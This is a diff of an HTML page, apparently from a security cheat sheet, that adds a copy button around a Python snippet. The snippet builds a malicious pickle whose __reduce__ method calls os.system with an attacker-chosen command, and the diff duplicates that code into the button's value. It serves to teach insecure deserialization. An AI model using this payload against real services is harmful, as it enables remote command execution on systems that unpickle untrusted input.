@@ -383,7 +383,7 @@ This method should return a tuple of elements :
 - The first being a callable
 - The others arguments</p>
 <p>Here is a function to generate a string:</p>
-<pre><code class="language-python">import pickle
+<div class="clipboard-content">  <pre><code class="language-python">import pickle
 
 def generate_pickle(cmd):
 
@@ -395,7 +395,19 @@ def generate_pickle(cmd):
     return pickle.dumps(PickleRCE())
 
 print(generate_pickle('{CMD}'))
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="import pickle
+
+def generate_pickle(cmd):
+
+    class PickleRCE(object):
+        def __reduce__(self):
+            import os
+            return (os.system, (cmd,))
+
+    return pickle.dumps(PickleRCE())
+
+print(generate_pickle('{CMD}'))
+">    Copy  </button></div></div>
             
           </div>
           <footer>
